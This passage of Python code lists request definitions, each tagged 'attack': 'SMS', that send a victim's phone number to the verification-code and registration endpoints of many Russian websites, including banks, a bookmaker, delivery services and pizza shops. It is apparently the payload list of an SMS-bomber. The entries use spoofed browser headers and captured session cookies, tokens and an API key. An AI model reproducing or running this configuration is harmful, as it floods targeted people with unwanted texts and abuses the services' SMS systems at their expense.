            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://lk.zaim-express.ru', 'Referer': 'https://lk.zaim-express.ru/app/step1_register', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'CellNumber={number}',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Fon.bet', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://clientsapi51w.bk6bba-resources.com/cps/superRegistration/createProcess',
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://www.fon.bet', 'Referer': 'https://www.fon.bet/account/registration/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': '{"fio":"","password":"drtfyghuijk95","email":"","emailAdvertAccepted":true,"phoneNumber":"+' + str(number) + '","webReferrer":"https://www.fon.bet/?utm_referrer=https%3a%2f%2fyandex.uz%2f","advertInfo":"","platformInfo":"' + user_agent()[1] + '","promoId":"","ecupis":true,"birthday":"1984-08-18","sysId":1,"lang":"ru","appVersion":"4.22.2","deviceId":"6CB80A14004A3CC0B795B168E6602A46"}',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'SvoeFermerstvo.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code',
            'cookies': {'00bcc2c49129af9bd7e2d92cb51ab14c': 'dfe102eea43a3aac853e562fd7cef8b6', 'cookiesession1': '678A3F3F91CA7886896C974B077C5464', '33dc6fb66f07bbc13d7e8a3e3a4df978': 'dfe102eea43a3aac853e562fd7cef8b6', 'ce2186f97fc08728512058e32d42e3a8': 'dfe102eea43a3aac853e562fd7cef8b6', '_ym_uid': '1678110687188489973', '_ym_d': '1678110687', '_ym_visorc': 'w', '_ym_isad': '1', 'remove_token': '1', 'tmr_lvid': 'a596bf3997ba6be0d99fd4fb3da6727c', 'tmr_lvidTS': '1678110693130', 'tmr_detect': '1%7C1678110693137', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', 'mindboxDeviceUUID': '617dfdf8-0b9d-40f2-ae6d-0da88b5cabdd', 'directCrm-session': '%7B%22deviceGuid%22%3A%22617dfdf8-0b9d-40f2-ae6d-0da88b5cabdd%22%7D',},
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://svoefermerstvo.ru', 'Referer': 'https://svoefermerstvo.ru/auth?authFrom=index&backurl=https%3A%2F%2Fsvoefermerstvo.ru%2F&failurl=https%3A%2F%2Fsvoefermerstvo.ru%2F', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'login': f'+{number}',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Myski.Sibgenco.Services', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://myski.sibgenco.services/Register/VerifyRegisterAsync',
            'cookies': {'_ym_uid': '167810951484027108', '_ym_d': '1678109514', '_ym_isad': '1', 'agreement': 'true', 'city': '.myski',},
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://myski.sibgenco.services', 'Referer': 'https://myski.sibgenco.services/Register', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'Login': username(), 'Password': 'dTf-SZ3-ZJZ-RZ3!', 'ConfirmPassword': 'dTf-SZ3-ZJZ-RZ3!', 'User': {'PhoneNumber': number, 'FirstName': 'User', 'MiddleName': 'Lolkin', 'Email': email(),}, 'IsAgreeRules': True,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'lk.MySberTips.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://lk.mysbertips.ru/sbrftips-proxy/registration/start',
            'cookies': {'_ym_uid': '1678111169970523360', '_ym_d': '1678111169', '_ym_isad': '1', 'adtech_uid': '41c9d435-e594-4517-8915-755700e26c3e%3Amysbertips.ru', 'user-id_1.0.5_lr_lruid': 'pQ8AAMLxBWTKOajiAWR6nQA%3D', '_sa': 'SA1.734aa60b-42a1-4375-8e64-25262c4122eb.1678111169', 'cookiesession1': '678B28E27071608A18BB09961E2EBE7B', '_ym_visorc': 'w',},
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://lk.mysbertips.ru', 'Referer': 'https://lk.mysbertips.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'login': str(number)[1:],},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': '4Lapy.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://4lapy.ru/ajax/confirmation/phone/send-code',
            'cookies': {'_gcl_au': '1.1.1567219556.1678109863', '_ym_uid': '1678109864190412947', '_ym_d': '1678109864', '_ga': 'GA1.2.1453149578.1678109864', '_gid': 'GA1.2.1405418431.1678109864', '_ym_visorc': 'b', 'tmr_lvid': 'b197369c621e1b341217aec17ef9b021', 'tmr_lvidTS': '1678109863799', '_ymab_param': '_2hrZAMN88pBDvfv-e9arKSnsVPBLoYFlysmvkozVmP-M9yRHTrOkMaR1l9sy2PFvrRs-g6xjZ5w5qF9fBSqXzntEGc', 'rrpvid': '13000926235711', '__exponea_etc__': '546675da-f6ba-4e70-aec3-2a0c0c26a295', '__exponea_time2__': '0.2851674556732178', 'rcuid': '6405eca8f3140cdce7078269', 'PHPSESSID': '0kkiib2bullup80ch9jtvrdvi3', 'flocktory-uuid': '0cdf3f16-b8c4-41d1-996e-47384df347c9-4', 'skipCache': '0', 'selected_city_code': '0000073738', 'cancel_mobile_app': '0', 'show_mobile_app': '1', 'testcookie': 'e0a5fe5fe86ada300005a1978e97b378493ad3f', 'BX_USER_ID': '70b7d2d41f68c6d57aa721d6a45d1e66', '_ym_isad': '1', '_userGUID': '0:lewvaf3d:qLmZkBF0btNgLd0O0l2vAiFojNs4Zsep', 'dSesn': '2b8231f5-a43a-fbeb-905f-401ed135c4d4', '_dvs': '0:lewvaf3d:mbqzqW6Dz8eR0tidmuXp~8H38T0M~9yX', '_gat': '1', '_gat_UA-229621277-1': '1', 'tmr_detect': '1%7C1678109929627', 'user_geo_location': '%5B%5D', '_gat_UA-30730607-1': '1',},
            'headers': {'authority': '4lapy.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json;charset=utf-8', 'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0NTMzODkiLCJhcCI6IjMyODAxMDM4MyIsImlkIjoiMjNiZjcyZTI0ZWE4NjgzMCIsInRyIjoiZTM4YjhhMWViNWJjYzkwYzk2YmM3NWRjYmE3NjBlYzAiLCJ0aSI6MTY3ODEwOTk0NjQzNn19', 'origin': 'https://4lapy.ru', 'referer': 'https://4lapy.ru/personal/register/?backurl=%2F', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'traceparent': '00-e38b8a1eb5bcc90c96bc75dcba760ec0-23bf72e24ea86830-01', 'tracestate': '3453389@nr=0-1-3453389-328010383-23bf72e24ea86830----1678109946436', 'user-agent': user_agent()[1],},
            'json': {'form_type': 'form_registration_on_site', 'phone': f'+{number}', 'resend': False,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'SberBank.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://sbi.sberbank.ru:9443/ic/dcb/rest/auth/guest-area/send-confirmation-code',
            'cookies': {'f5_cspm': '1234', '_gcl_au': '1.1.381869431.1678123079', 'utm_source': 'yandex', 'utm_medium': 'organic', 'utm_campaign': '', 'utm_content': '', '_ym_uid': '1678123079882728779', '_ym_d': '1678123079', 'tmr_lvid': 'a952a2c9bb693eccdd17636da1dcd0ef', 'tmr_lvidTS': '1678123079113', '_sa': 'SA1.1a728eae-8c70-4604-8410-40455f144ac5.1678123079', 'top100_id': 't1.3122244.179766790.1678123079214', 'adtech_uid': 'b6bf143a-daeb-4489-a829-1705b2129eba%3Asberbank.ru', '_sv': 'SA1.993521a0-6e91-44f8-a92d-8b1c5f63dcfb.1678123136', 'sb-pid': 'gYE3i0PPS4JFP60ahTkBJ02HAAABhrfuLi0lkx2ayaBsOpmicsEeAnJJfKY78olw7m5fgchg80UuIg', 't2_sid_3122244': 's1.1698066543.1678123079215.1678123098885.1.11.11', 'JSESSIONID': '00001UgXiDveWtyyazvNXr6iTgq:1e98i9283', 'TS01efecdd': '017c9605479be835f7221bf5556b97f86f404623d191b74de500b67037ae2c490214b660df02f17d163ec9079d830057b8a5ca6560e2bb24e50802ffadf37c77f6fe4964950bc35f121fc850df7de81ead5a1bb7918aed3f31800cd7603eff7b51860d6311', 'sbb-sid': 'd8ed85de-1371-4e26-9ad8-33757dec502d', 'sbb-id': 'eyJqdGkiOiIzNGZjYTYwYy1hNjNlLTQyZTMtOTM0Mi1kYzE3OTBiZjYyODQiLCJvIjoiMWVkY2JiMDEtMjZhOS00ZWFiLTkzYmUtODgwNGE3YjJkODM3Iiwic2kiOiJkOGVkODVkZS0xMzcxLTRlMjYtOWFkOC0zMzc1N2RlYzUwMmQiLCJ0cyI6MTY3ODIxNjY2ODAwMiwidiI6IjIwMjAxMCJ9.z9dfElzGqFRCOeUTzopwsrCBFcubE2RDmX4o0Ys_UJ4', 'sbb-pid': 'eyJqdGkiOiI5Y2Q5YjBlYy00ZDE1LTQ3MDEtYTQ5Yi1mYjVlY2U2ZDI1ZTAiLCJvIjoiMWVkY2JiMDEtMjZhOS00ZWFiLTkzYmUtODgwNGE3YjJkODM3IiwidHMiOjE2NzgyMTY2NjgwMDIsInYiOiIyMDIwMTAifQ.Zi2hyIpahfcz0iS9UOK9C8YnqgqYt36IP-hC4SaIGBE', '_ym_isad': '2',},
            'headers': {'Accept': 'application/json', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://sbi.sberbank.ru:9443', 'Referer': 'https://sbi.sberbank.ru:9443/ic/dcb/?partnerCode=platform', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'csrftoken': '7780076808322391238', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phoneNumber': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'MtsBank.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://sso.mtsbank.ru/api/v2/login',
            'cookies': {'_ym_uid': '1678214577603085211', '_ym_d': '1678214577', '_ym_isad': '1', 'tmr_lvid': '4ef689638eeace309fade8be5077279f', 'tmr_lvidTS': '1678214577117', 'go_session_id': 'YmE4ZGNiMzMtNGRlOS00ODgyLTgzYzUtMzFiMjUwNjg4NDIw.7847c2fd353ab86f5e47584d2cb943153d2d62d3',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://sso.mtsbank.ru', 'Referer': 'https://sso.mtsbank.ru/login/mtsmoney/auth/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'login': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'CDEK.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.cdek.ru/api-site/auth/send-code',
            'cookies': {'_ym_uid': '1677960820709714381', '_ym_d': '1677960820', 'sbjs_migrations': '1418474375998%3D1', 'sbjs_current_add': 'fd%3D2023-03-05%2001%3A13%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%7C%7C%7Crf%3Dhttps%3A%2F%2Fyandex.uz%2F', 'sbjs_first_add': 'fd%3D2023-03-05%2001%3A13%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%7C%7C%7Crf%3Dhttps%3A%2F%2Fyandex.uz%2F', 'sbjs_current': 'typ%3Dreferral%7C%7C%7Csrc%3Dyandex.uz%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29', 'sbjs_first': 'typ%3Dreferral%7C%7C%7Csrc%3Dyandex.uz%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29', 'tmr_lvid': '387b67af92cddb701500fb1567c81e49', 'tmr_lvidTS': '1677960820317', '_ga': 'GA1.2.1803882943.1677960820', 'mindboxDeviceUUID': 'd2de24ae-7da0-46e5-a989-85b9a4cb348b', 'directCrm-session': '%7B%22deviceGuid%22%3A%22d2de24ae-7da0-46e5-a989-85b9a4cb348b%22%7D', 'flomni_5d713233e8bc9e000b3ebfd2': '{%22userHash%22:%2291727e6d-fbb5-45f4-bd5f-84e563e73281%22}', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_ym_isad': '1', '_ym_visorc': 'b', 'cityid': '11562', 'sbjs_udata': 'vst%3D4%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20YaBrowser%2F23.1.4.778%20Yowser%2F2.5%20Safari%2F537.36', 'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.cdek.ru%2Fru%2F', '_gid': 'GA1.2.190633165.1678219160', 'tmr_detect': '1%7C1678219160086',},
            'headers': {'Accept': 'application/json', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://www.cdek.ru', 'Referer': 'https://www.cdek.ru/ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'locale': 'ru', 'websiteId': 'ru', 'phone': f'+{number}', 'token': None,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'TashirPizza.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://tashirpizza.ru/ajax/mindbox_send_sms',
            'cookies': {'__lhash_': 'cd9bf5fa4974786a6df6d154da277621', '_gid': 'GA1.2.1483796065.1677961924', '_ym_uid': '1672947102582579075', '_ym_d': '1677961924', '_ym_isad': '1', 'tashir_vps': 'ecs0fbgaoocrb534l25r2tcao3', 'city_id': '1', '_gat_UA-163981186-1': '1', '_ga': 'GA1.1.884344881.1677961924', '_ga_GKW2YSN7N0': 'GS1.1.1678002112.2.1.1678002129.43.0.0',},
            'headers': {'authority': 'tashirpizza.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'cookie': '__lhash_=cd9bf5fa4974786a6df6d154da277621; _gid=GA1.2.1483796065.1677961924; _ym_uid=1672947102582579075; _ym_d=1677961924; _ym_isad=1; tashir_vps=ecs0fbgaoocrb534l25r2tcao3; city_id=1; _gat_UA-163981186-1=1; _ga=GA1.1.884344881.1677961924; _ga_GKW2YSN7N0=GS1.1.1678002112.2.1.1678002129.43.0.0', 'origin': 'https://tashirpizza.ru', 'referer': 'https://tashirpizza.ru/account', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'phone={number}&smsType=simple',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'START.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.start.ru/auth/phone/register',
            'cookies': {'auth': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI2M2ZkZGY1M2M5YjJlNTM2ZWQyMjA5MTciLCJwaWQiOiI2OTMyOThmMC1iNzc1LTRjMzYtODNmMC0zY2E0ZGM5MjlhODIiLCJkaWQiOiI0YzMwNjg2MC1jMmUyLTQ4NWYtYmM5ZS1lZjcwYjI4OWU0MjYiLCJhbm9ueW1vdXMiOnRydWUsImZvcl9raWRzIjpmYWxzZX0.HUjFSNFRxxLMrnfqRejlqKNTjFA3HLtaa7cp1ysW7K8', '_gcl_au': '1.1.1610440329.1677582168', '_ym_uid': '1677582168402783842', '_ym_d': '1677582168', 'tmr_lvid': '387af76bc6fe0f21425689ea2faf90c1', 'tmr_lvidTS': '1677582168526', 'afUserId': 'a9f07f3f-5858-4674-be83-9722b5b9303c-p', 'AF_SYNC': '1677582171574', 'startOrigin': 'start.ru', 'IS_PAID': 'False', 'FOR_KIDS': 'False', 'AUTHORIZED_USER': 'False', '_gid': 'GA1.2.378869750.1677916773', '_gat_UA-101169242-5': '1', '_dc_gtm_UA-101169242-10': '1', '_clck': 'runrrr|1|f9m|0', '_ym_isad': '1', '_ym_visorc': 'b', '_clsk': '17voyoz|1677916773804|1|0|q.clarity.ms/collect', 'startSliderHeight': 'staticHeight', '_ga': 'GA1.2.1137693196.1677582168', '_ga_TFM2K2079M': 'GS1.1.1677916772.2.1.1677916797.35.0.0',},
            'headers': {'authority': 'api.start.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://start.ru', 'referer': 'https://start.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'phone': number, 'status_gdpr': True,},
            'params': {'apikey': 'a20b12b279f744f2b3c7b5c5400c4eb5',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Kino.Tricolor.TV', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kino.tricolor.tv/api/register.php',
            'cookies': {'__lhash_': 'b7c31d4d957d39846657360496c69b2e', '_gcl_au': '1.1.32794319.1677582900', 'tmr_lvid': '1e0ac7a5f2073d75a4fd93a5a427030f', 'tmr_lvidTS': '1677582902573', '_ym_uid': '1677582903666921751', '_ym_d': '1677582903', 'adtech_uid': '94730a43-413d-41bb-80f9-262e08e8e73c%3Atricolor.tv', 'top100_id': 't1.7450207.831001938.1677582902936', 'afUserId': 'e0ddd8a7-ac7a-4ac5-8e76-1f6a67f1c52b-p', 'AF_SYNC': '1677582904574', 'BITRIX_SM_SALE_UID': '0', '_gid': 'GA1.2.1403796165.1677918462', '_gat_UA-70840377-1': '1', '_gat_UA-46398561-16': '1', '_ym_visorc': 'b', '_ga_LF800FZY0Z': 'GS1.1.1677918462.2.1.1677918472.0.0.0', 'last_visit': '1677900473093%3A%3A1677918473093', 't3_sid_7450207': 's1.292995422.1677918462954.1677918473296.2.4', '_ga': 'GA1.2.2698192.1677582902', 'tmr_detect': '1%7C1677918473707', '_ym_isad': '1', 'PHPSESSID': 'xcNCM7PuEVGZ8s3xUyx79AO8pcmwvBLD',},
            'headers': {'authority': 'kino.tricolor.tv', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://kino.tricolor.tv', 'referer': 'https://kino.tricolor.tv/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'phone': str(number)[1:], 'action': 'start',},
            # Вход/регистрация по смс
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Kino.Tricolor.TV', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kino.tricolor.tv/api/register.php',
            'cookies': {'__lhash_': 'b7c31d4d957d39846657360496c69b2e', '_gcl_au': '1.1.32794319.1677582900', 'tmr_lvid': '1e0ac7a5f2073d75a4fd93a5a427030f', 'tmr_lvidTS': '1677582902573', '_ym_uid': '1677582903666921751', '_ym_d': '1677582903', 'adtech_uid': '94730a43-413d-41bb-80f9-262e08e8e73c%3Atricolor.tv', 'top100_id': 't1.7450207.831001938.1677582902936', 'afUserId': 'e0ddd8a7-ac7a-4ac5-8e76-1f6a67f1c52b-p', 'AF_SYNC': '1677582904574', 'BITRIX_SM_SALE_UID': '0', '_gid': 'GA1.2.1403796165.1677918462', '_gat_UA-70840377-1': '1', '_gat_UA-46398561-16': '1', '_ym_visorc': 'b', '_ga_LF800FZY0Z': 'GS1.1.1677918462.2.1.1677918472.0.0.0', 'last_visit': '1677900473093%3A%3A1677918473093', 't3_sid_7450207': 's1.292995422.1677918462954.1677918473296.2.4', '_ga': 'GA1.2.2698192.1677582902', 'tmr_detect': '1%7C1677918473707', '_ym_isad': '1', 'PHPSESSID': 'XKQCqWej6jBF322dM38UIMjc8zGYK5Oy',},
            'headers': {'authority': 'kino.tricolor.tv', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://kino.tricolor.tv', 'referer': 'https://kino.tricolor.tv/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'phone': str(number)[1:], 'tricolorId': '', 'action': None, 'sms': None,},
            # Повторная отправка смс
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'PapaKarlo68.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://papakarlo68.ru/ajax/register_form.php',
            'cookies': {'_ym_uid': '1678024821177786565', '_ym_d': '1678024821', '_ym_isad': '1', '_ym_visorc': 'w', 'BX_USER_ID': '6f8db0b142121190f18d4f5cd7394395', 'BITRIX_SM_SOUND_LOGIN_PLAYED': 'Y', 'PHPSESSID': 'ddd7e3fe81a1d3955c915efed0f7cb46', 'BITRIX_SM_SALE_UID': '0',},
            'headers': {'authority': 'papakarlo68.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://papakarlo68.ru', 'referer': 'https://papakarlo68.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'phone={number}&password=sxctrvbyun&name=User&last_name=Name&type=register',
            # Регистрация по смс
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'PapaKarlo68.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://papakarlo68.ru/ajax/recovery_form.php',
            'cookies': {'_ym_uid': '1678024821177786565', '_ym_d': '1678024821', '_ym_isad': '1', '_ym_visorc': 'w', 'BX_USER_ID': '6f8db0b142121190f18d4f5cd7394395', 'BITRIX_SM_SOUND_LOGIN_PLAYED': 'Y', 'BITRIX_SM_SALE_UID': '0', 'PHPSESSID': 'd5303b2dd7856ea20b90c5fa173d8efa',},
            'headers': {'authority': 'papakarlo68.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://papakarlo68.ru', 'referer': 'https://papakarlo68.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'phone={number}&type=recovery',
            # Восстановление пароля по смс
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'MegaFon.TV', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://bmp.megafon.tv/api/v10/auth/register/msisdn',
            'cookies': {'_gcl_au': '1.1.14805258.1677582858', '_ym_uid': '1677582858506041093', '_ym_d': '1677582858', 'tmr_lvid': '17c32524620a958112ba2605e882e1ee', 'tmr_lvidTS': '1677582858387', 'SessionID': 'IwkhzPX4EX8YNLcYhwwOLyfJOobqEA3dDRFbK0S0_0Q', '_ym_isad': '1', '_gid': 'GA1.2.814737135.1677917652', '_dc_gtm_UA-5504542-11': '1', '_dc_gtm_UA-47701048-1': '1', '_ga_5F6HJ10CT9': 'GS1.1.1677917651.2.1.1677917772.0.0.0', '_ga': 'GA1.1.1374272953.1677582858', '_fbp': 'fb.1.1677917772641.922250839',},
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://megafon.tv', 'Referer': 'https://megafon.tv/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'msisdn': f'+{number}', 'password': '759426245',}
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Pizza-Prosto.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': f'https://api.pizza-prosto.ru/P_login_sms?phone={str(number)[1:]}&_=1666432552205',
            'headers': user_agent()[0],
            'data': {'phone': str(number)[1:]},
        },
        {
